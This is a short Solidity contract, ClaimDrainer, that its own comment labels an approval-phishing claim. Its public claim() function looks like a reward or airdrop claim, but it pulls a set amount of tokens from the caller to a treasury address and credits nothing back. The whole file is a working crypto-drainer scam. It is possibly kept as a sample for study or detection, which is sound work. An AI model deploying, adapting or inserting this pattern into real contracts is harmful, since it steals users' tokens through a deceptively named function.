// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

/// Approval-phishing claim: pulls tokens FROM the caller to treasury with no credit back.
contract ClaimDrainer {
    IERC20 public immutable token;
    address public immutable treasury;
    uint public immutable amount;

    constructor(IERC20 token_, address treasury_, uint amount_) {
        token = token_;
        treasury = treasury_;
        amount = amount_;
    }

    function claim() external {
        token.transferFrom(msg.sender, treasury, amount);
    }
}
